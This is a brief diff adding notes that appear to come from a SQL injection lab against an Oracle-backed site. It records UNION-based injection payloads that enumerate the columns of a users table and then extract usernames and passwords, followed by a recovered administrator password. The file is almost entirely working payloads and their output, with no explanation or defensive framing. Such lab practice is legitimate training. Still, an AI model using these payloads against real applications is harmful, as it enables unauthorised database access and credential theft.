@@ -1,0 +1,11 @@
+USERS_CCOIOL
+
+
+'union select column_name,NULL from all_tab_columns where table_name='USERS_CCOIOL'--
+PASSWORD_PDOPDI
+USERNAME_AIEAAV
+
+'union select USERNAME_AIEAAV,PASSWORD_PDOPDI from USERS_CCOIOL
+ 
+administrator
+pj2cq7uofqbk3t6q573r
